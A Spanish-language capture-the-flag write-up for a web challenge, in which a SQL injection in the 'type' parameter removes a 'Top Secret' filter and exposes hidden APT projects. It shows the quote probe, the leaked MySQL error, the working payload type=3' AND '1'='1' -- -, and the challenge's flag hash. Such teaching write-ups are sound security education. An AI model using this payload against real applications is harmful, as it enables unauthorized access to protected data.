# NSA - UTN-FRC

**Dificultad:** CTF
**Fecha:** 09/2026
**Sistema:** Web
**Objetivo:** Acceder a los proyectos de tipo **APT** con nivel **Top Secret**
**Acceso inicial:** SQL Injection mediante manipulación del parámetro `type`

## Herramientas

`Chrome DevTools` `Burp Suite`

## Técnicas

`Web Enumeration` `HTTP Request Analysis` `SQL Injection` `Parameter Manipulation` `Access Control Bypass`

## Introducción

El desafío consiste en ayudar a un agente secreto a acceder a proyectos de tipo **APT (Advanced Persistent Threat)**.

La aplicación permite consultar proyectos según su tipo mediante un parámetro `type`.

El agente sabe que los proyectos APT tienen un nivel de acceso **Top Secret**, pero la aplicación los excluye debido a las restricciones de acceso.

El objetivo es analizar el funcionamiento de la aplicación y encontrar una forma de modificar la consulta para acceder a los proyectos que normalmente no son mostrados.

## Reconocimiento

Al acceder a la aplicación se observa una tabla con información relacionada con empleados y proyectos.

La aplicación realiza peticiones al siguiente endpoint:

```text
/backend/index.php
```

La consulta de los proyectos se realiza mediante el parámetro:

```text
type
```

Se identifican diferentes valores para este parámetro:

```text
type=1
type=2
type=3
```

El valor `3` corresponde a los proyectos de tipo **APT**.

Al realizar la petición:

```http
GET /backend/index.php?type=3
```

el servidor responde:

```json
{
    "status": "ok",
    "data": {
        "projects": []
    }
}
```

A diferencia de los otros tipos, la consulta de `type=3` no devuelve proyectos.

## Análisis de la petición

Se analiza la petición utilizando las herramientas de desarrollo del navegador y se observa que el parámetro `type` es enviado directamente al backend:

```http
GET /backend/index.php?type=3
```

La respuesta vacía resulta llamativa debido a que el desafío indica explícitamente que existen proyectos de tipo APT.

Se realiza una prueba agregando una comilla simple al valor del parámetro:

```text
type=3'
```

El servidor devuelve un error de sintaxis SQL:

```text
You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server version
```

Además, el mensaje permite observar parte de la consulta SQL ejecutada:

```sql
AND p.id_nivel != (
    SELECT id FROM niveles
    WHERE nombre='Top Secret'
)
```

Esto permite identificar que la aplicación está realizando un filtro para excluir los proyectos cuyo nivel de acceso es **Top Secret**.

El error también confirma que el parámetro `type` está siendo incorporado en una consulta SQL de forma insegura.

## Identificación de la vulnerabilidad

El comportamiento observado indica la presencia de una vulnerabilidad de **SQL Injection**.

La aplicación aparentemente utiliza el valor recibido mediante `type` dentro de una consulta SQL sin realizar una parametrización adecuada.

Conceptualmente, la consulta contiene una estructura similar a:

```sql
WHERE p.tipo = '3'
AND p.id_nivel != (
    SELECT id FROM niveles
    WHERE nombre='Top Secret'
)
```

La primera comilla del payload permite cerrar la cadena correspondiente al valor de `type`.

A partir de ese punto es posible introducir condiciones SQL adicionales.

## Manipulación del parámetro

Se prueba el siguiente valor:

```text
type=3' AND '1'='1' -- -
```

La expresión:

```sql
'1'='1'
```

es siempre verdadera.

Por otro lado:

```text
-- -
```

permite comentar el resto de la consulta SQL en MySQL.

De forma conceptual, la consulta pasa a comportarse como:

```sql
WHERE p.tipo = '3'
AND '1'='1'
-- resto de la consulta
```

De esta manera, el filtro posterior encargado de excluir los proyectos con nivel **Top Secret** deja de aplicarse.

## Bypass del control de acceso

La consulta original contiene una condición equivalente a:

```sql
AND p.id_nivel != (
    SELECT id FROM niveles
    WHERE nombre='Top Secret'
)
```

Esta condición impide que los proyectos con nivel **Top Secret** sean incluidos en los resultados.

Al utilizar:

```text
type=3' AND '1'='1' -- -
```

se consigue modificar la consulta SQL y evitar la aplicación de dicha condición.

El servidor responde entonces con información que anteriormente no estaba disponible.

## Explotación

La petición utilizada es:

```http
GET /backend/index.php?type=3' AND '1'='1' -- -
```

La respuesta obtenida contiene los siguientes proyectos:

| Código    | Proyecto                                        | Tipo            | Nivel      | Owner |
| --------- | ----------------------------------------------- | --------------- | ---------- | ----- |
| `NS4_AS2` | Colombia warfare                                | Spying          | Secret     | Frank |
| `NS4_AN1` | Chinese Firewall                                | Targeted attack | Restricted | Eric  |
| `NS4_A1L` | Nisman case                                     | Spying          | Restricted | Brian |
| `NS4_B2W` | Terrorists - `141e9ea9d1c4ade203ffe3ee03ebff1c` | APT             | Top Secret | Brian |
| `NS4_OIL` | EkoParty destruction                            | APT             | Top Secret | Eric  |

Entre los resultados aparecen finalmente los dos proyectos APT:

```text
NS4_B2W
Terrorists - 141e9ea9d1c4ade203ffe3ee03ebff1c
```

y:

```text
NS4_OIL
EkoParty destruction
```

Ambos tienen:

```text
Tipo: APT
Nivel: Top Secret
```

## Vulnerabilidad

La aplicación presenta una vulnerabilidad de **SQL Injection** debido a que el parámetro:

```text
type
```

puede ser manipulado para modificar la consulta SQL ejecutada por el servidor.

Además, la vulnerabilidad permite realizar un **bypass del control de acceso**, ya que es posible evitar la condición que excluye los proyectos con nivel `Top Secret`.

El problema se produce porque los datos controlados por el usuario son incorporados a la consulta SQL sin utilizar correctamente consultas parametrizadas.

## Cadena de explotación

```text
Inspección de la aplicación
        ↓
Identificación del parámetro type
        ↓
Prueba con type=3
        ↓
Respuesta vacía
        ↓
Prueba con comilla simple
        ↓
Error de sintaxis SQL
        ↓
Confirmación de SQL Injection
        ↓
Identificación del filtro Top Secret
        ↓
Manipulación del parámetro type
        ↓
Bypass del filtro de acceso
        ↓
Obtención de proyectos APT
```

## Conclusión

El desafío demuestra cómo una vulnerabilidad de **SQL Injection** puede utilizarse para modificar una consulta SQL y evadir un mecanismo de control de acceso.

El parámetro `type` permite introducir contenido controlado por el usuario dentro de la consulta SQL. Mediante la utilización de una comilla simple, una condición siempre verdadera y un comentario SQL, fue posible alterar el comportamiento de la consulta.

La aplicación originalmente excluía los proyectos con nivel **Top Secret**, pero la manipulación de la consulta permitió obtenerlos.

Los proyectos APT identificados fueron:

```text
NS4_B2W - Terrorists - 141e9ea9d1c4ade203ffe3ee03ebff1c
NS4_OIL - EkoParty destruction
```

El desafío demuestra la importancia de utilizar **consultas SQL parametrizadas**, validar correctamente los datos recibidos desde el cliente y aplicar los controles de autorización de forma segura en el servidor.

## Evidencias

> Agregar aquí las capturas correspondientes al proceso:
>
> * Tabla inicial de empleados y proyectos.
> * Petición `GET /backend/index.php?type=3`.
> * Respuesta vacía para `type=3`.
> * Petición con `type=3'`.
> * Error de sintaxis SQL mostrando el filtro `Top Secret`.
> * Payload `type=3' AND '1'='1' -- -`.
> * Respuesta mostrando los proyectos APT.
> * Proyecto `NS4_B2W` y su información.
> * Proyecto `NS4_OIL` y su información.
